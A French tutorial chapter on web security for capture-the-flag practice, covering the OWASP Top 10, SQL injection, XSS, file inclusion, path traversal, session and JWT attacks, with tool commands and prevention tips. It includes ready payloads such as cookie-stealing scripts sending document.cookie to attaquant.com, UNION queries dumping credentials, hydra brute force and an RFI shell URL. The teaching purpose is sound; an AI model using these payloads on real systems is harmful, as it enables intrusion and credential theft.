# Chapitre 03 — Sécurité Web

## Introduction

Les applications web sont la cible la plus fréquente des attaquants car elles sont accessibles depuis Internet. Comprendre comment elles sont exploitées permet de les développer de façon sécurisée.

> Tout ce qui suit doit être pratiqué uniquement sur des **environnements de test autorisés** (Root-Me, DVWA, tes propres VMs).

---

## OWASP Top 10

L'**OWASP** (Open Web Application Security Project) publie la liste des 10 vulnérabilités web les plus critiques.

| # | Catégorie | Description courte |
|---|-----------|-------------------|
| A01 | Broken Access Control | Accès à des ressources non autorisées |
| A02 | Cryptographic Failures | Données sensibles non chiffrées |
| A03 | Injection | SQL, commandes OS, LDAP… |
| A04 | Insecure Design | Mauvaise conception dès le départ |
| A05 | Security Misconfiguration | Configuration par défaut, debug activé |
| A06 | Vulnerable Components | Bibliothèques avec failles connues |
| A07 | Auth Failures | Brute force, sessions faibles |
| A08 | Software Integrity Failures | CI/CD compromis, dépendances |
| A09 | Logging Failures | Logs insuffisants |
| A10 | SSRF | Le serveur fait des requêtes pour l'attaquant |

---

## Outils essentiels pour le web

### Burp Suite
**Burp Suite** est le proxy de référence pour tester les applications web. Il intercepte les requêtes HTTP entre le navigateur et le serveur, permettant de les modifier.

1. Lancer Burp Suite
2. Configurer le navigateur pour utiliser le proxy `127.0.0.1:8080`
3. Naviguer sur le site cible → les requêtes apparaissent dans Burp
4. Modifier les requêtes, rejouer des requêtes, fuzzer des paramètres

### Outils en ligne de commande
```bash
# curl — faire des requêtes HTTP personnalisées
curl -v http://target.com/page
curl -X POST -d "param=valeur" http://target.com/login
curl -b "session=abc" -H "X-Admin: true" http://target.com/admin
curl --path-as-is http://target.com/../../../etc/passwd

# gobuster / ffuf — brute-force de répertoires
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt
ffuf -u http://target.com/page?param=FUZZ -w wordlist.txt  # Fuzzer un paramètre

# nikto — scanner de vulnérabilités web
nikto -h http://target.com
```

---

## Inspection du code source et des outils de développement

La première chose à faire sur un challenge web : **inspecter le code source**.

```
Dans le navigateur :
  - Clic droit → "Afficher le code source" (Ctrl+U)
  - F12 → Outils de développement

Quoi chercher :
  - Commentaires HTML <!-- ... -->
  - Fichiers JavaScript inclus
  - Paramètres cachés dans les formulaires
  - Clés API dans le JS
  - Chemins vers d'autres ressources
```

---

## Injection SQL (SQLi)

### Principe
Si une application insère directement les données utilisateur dans une requête SQL sans les nettoyer, on peut modifier la logique de la requête.

**Code PHP vulnérable :**
```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
```

Si on passe `id=1 OR 1=1`, la requête devient :
```sql
SELECT * FROM users WHERE id = 1 OR 1=1
-- Retourne TOUS les utilisateurs !
```

### Test basique d'injection SQL
```
# Tester si un champ est vulnérable
'             → erreur SQL → potentiellement vulnérable
1 OR 1=1      → retourne tous les résultats
1 AND 1=2     → retourne rien
' OR '1'='1   → bypass d'authentification classique

# Commentaires SQL (pour ignorer la suite)
--            MySQL, SQLite, MSSQL
#             MySQL
/**/          tous

# Bypass de login classique
admin' --
' OR '1'='1' --
' OR 1=1 --
```

### UNION-based SQLi
```sql
-- Déterminer le nombre de colonnes
ORDER BY 1--
ORDER BY 2--
...jusqu'à une erreur

-- Extraire des données avec UNION
' UNION SELECT NULL, NULL --
' UNION SELECT 1, version() --
' UNION SELECT 1, database() --
' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables --
' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT 1, group_concat(login,':',password) FROM users --
```

### sqlmap — automatiser les injections SQL
```bash
# Test basique
sqlmap -u "http://target.com/page?id=1"

# Avec POST
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Avec cookie de session
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Lister les bases de données
sqlmap -u "http://target.com/page?id=1" --dbs

# Lister les tables
sqlmap -u "http://target.com/page?id=1" -D mabase --tables

# Dumper une table
sqlmap -u "http://target.com/page?id=1" -D mabase -T users --dump
```

---

## Cross-Site Scripting (XSS)

### Principe
Le XSS consiste à injecter du code JavaScript dans une page web qui sera exécuté par le navigateur d'autres utilisateurs.

**Types :**
- **Reflected XSS** : le payload est dans la requête (URL, formulaire) et reflété dans la réponse
- **Stored XSS** : le payload est stocké en base et affiché à tous les visiteurs
- **DOM XSS** : le payload est injecté dans le DOM via JavaScript côté client

### Payloads XSS basiques
```html
<!-- Test si XSS possible -->
<script>alert(1)</script>
<script>alert('XSS')</script>

<!-- Si les balises script sont filtrées -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
<input onfocus="alert(1)" autofocus>

<!-- Voler des cookies -->
<script>document.location='http://attaquant.com/?c='+document.cookie</script>
<img src=x onerror="fetch('http://attaquant.com/?c='+document.cookie)">

<!-- Contourner les filtres basiques -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCRIPT>alert(1)</SCRIPT>
<img src=x oNeRrOr="alert(1)">
```

### Prévention XSS
```php
// PHP — Encoder les caractères spéciaux
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// JavaScript — Ne jamais insérer du HTML non traité
element.textContent = userInput;  // Sûr
// element.innerHTML = userInput; // DANGEREUX
```

---

## Inclusion de fichiers (LFI / RFI)

### LFI — Local File Inclusion
Si une application inclut un fichier basé sur un paramètre utilisateur, on peut tenter de lire des fichiers système.

```
# URL vulnérable
http://target.com/page?file=home.php

# Tenter de lire /etc/passwd
http://target.com/page?file=../../../etc/passwd
http://target.com/page?file=....//....//....//etc/passwd

# Fichiers intéressants à lire
/etc/passwd                    # Utilisateurs Linux
/etc/shadow                    # Mots de passe hashés (root requis)
/etc/hosts                     # Résolution DNS locale
/proc/self/environ             # Variables d'environnement du processus
/var/log/apache2/access.log    # Logs Apache (log poisoning possible)
/home/user/.bash_history       # Historique bash
```

### Null byte (anciennes versions PHP)
```
# PHP < 5.3.4 : le %00 termine la chaîne, ignore l'extension ajoutée
http://target.com/page?file=../../../etc/passwd%00
```

### RFI — Remote File Inclusion
Si `allow_url_include = On` dans PHP (rare aujourd'hui) :
```
http://target.com/page?file=http://attaquant.com/shell.php
```

---

## Traversée de répertoires (Path Traversal)

```
# Accéder à des fichiers hors du répertoire web
http://target.com/download?file=rapport.pdf
→ http://target.com/download?file=../../../etc/passwd

# Encodages alternatifs
../         →  %2e%2e%2f
..%2f       →  .. encodé partiellement
%2e%2e/     →  . encodé
```

---

## Authentification et gestion de sessions

### Attaques sur les sessions
```
1. Vol de cookie (XSS)
2. Fixation de session (forcer l'ID de session)
3. Prédiction de session (ID faible)
4. Session non invalidée après logout
```

### Test d'authentification
```bash
# Brute force HTTP avec hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form "/login:user=^USER^&pass=^PASS^:Login failed"

# Tester les identifiants par défaut
admin:admin, admin:password, admin:123456
root:root, root:toor
test:test, guest:guest
```

### JWT (JSON Web Token)
```
Format : header.payload.signature (encodés en base64)
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx

Attaques courantes :
1. Algorithme "none" : header = {"alg":"none"} → pas de vérification
2. Clé faible : brute-force de la clé secrète
3. Inversion RS256→HS256 si la clé publique est connue

# Décoder un JWT
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# Outil : https://jwt.io/
```

---

## Redirections ouvertes (Open Redirect)

```
# Si l'application redirige vers une URL fournie en paramètre
http://target.com/redirect?url=http://evil.com

# Peut être utilisé pour des attaques de phishing
http://trusted.com/redirect?url=http://evil.com/fake-login
```

---

## En-têtes HTTP de sécurité

```
# En-têtes à vérifier (leur absence = vulnérabilité potentielle)
Content-Security-Policy (CSP)     → Prévient le XSS
X-Frame-Options                   → Prévient le clickjacking
X-Content-Type-Options: nosniff  → Prévient le MIME sniffing
Strict-Transport-Security (HSTS) → Force HTTPS
Referrer-Policy                   → Contrôle l'en-tête Referer

# Vérifier avec curl
curl -I http://target.com
```

---

## Environnements de test

### DVWA (Damn Vulnerable Web Application)
Application web volontairement vulnérable, parfaite pour pratiquer.

```bash
# Avec Docker
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
# Accès : http://localhost/
# Login : admin / password
```

### WebGoat (OWASP)
```bash
docker pull webgoat/goat-and-wolf
docker run -p 8080:8080 webgoat/goat-and-wolf
# Accès : http://localhost:8080/WebGoat
```

---

## Challenges Root-Me — Web

Challenges recommandés sur [https://www.root-me.org/fr/Challenges/Web-Serveur/](https://www.root-me.org/fr/Challenges/Web-Serveur/) :

### Débutant (1-10 pts)
| Challenge | Points | Technique |
|-----------|--------|-----------|
| **HTML — Code source** | 1 pt | Lire le code source d'une page |
| **HTTP — Open Redirect** | 10 pts | Exploiter une redirection ouverte |
| **HTTP — User-agent** | 10 pts | Modifier l'en-tête User-Agent |
| **HTTP — Répertoire** | 10 pts | Inspecter les en-têtes HTTP |
| **Backup file** | 10 pts | Trouver un fichier de backup |
| **HTTP — POST** | 10 pts | Envoyer une requête POST modifiée |
| **HTTP — Cookies** | 10 pts | Manipulation de cookies |

### Intermédiaire (15-25 pts)
| Challenge | Points | Technique |
|-----------|--------|-----------|
| **SQL injection — Authentification** | 25 pts | Bypass de login SQL |
| **SQL injection — String** | 25 pts | Injection SQL basique |
| **XSS — Reflected** | 10 pts | Cross-Site Scripting réfléchi |
| **Directory traversal** | 15 pts | Traversée de répertoires |
| **Local File Inclusion** | 25 pts | LFI basique |
| **File upload — Double extension** | 15 pts | Upload de fichier malveillant |

### Avancé (30+ pts)
| Challenge | Points | Technique |
|-----------|--------|-----------|
| **SQL injection — Numériques** | 30 pts | SQLi avec entiers |
| **Remote File Inclusion** | 25 pts | RFI |
| **JWT — Faible secret** | 40 pts | Bruteforce de clé JWT |
| **XXE injection** | 40 pts | XML External Entity |

### Méthodologie recommandée
1. Lire l'énoncé attentivement
2. Explorer la page (source, cookies, headers)
3. Identifier les points d'entrée (formulaires, paramètres URL)
4. Tester manuellement, puis avec des outils si nécessaire
5. Ne regarder l'aide (forum) qu'en dernier recours

---

## Sites pour pratiquer

| Site | Lien | Description |
|------|------|-------------|
| Root-Me Web | [https://www.root-me.org/fr/Challenges/Web-Serveur/](https://www.root-me.org/fr/Challenges/Web-Serveur/) | Challenges web |
| PortSwigger Web Academy | [https://portswigger.net/web-security](https://portswigger.net/web-security) | Cours + labs gratuits (excellent) |
| OWASP WebGoat | [https://owasp.org/www-project-webgoat/](https://owasp.org/www-project-webgoat/) | App vulnérable interactive |
| HackTheBox Web | [https://www.hackthebox.com/](https://www.hackthebox.com/) | Challenges et machines |

---

[← Réseau](02-reseau.md) | [Retour au README](../README.md) | [Cryptographie →](04-cryptographie.md)
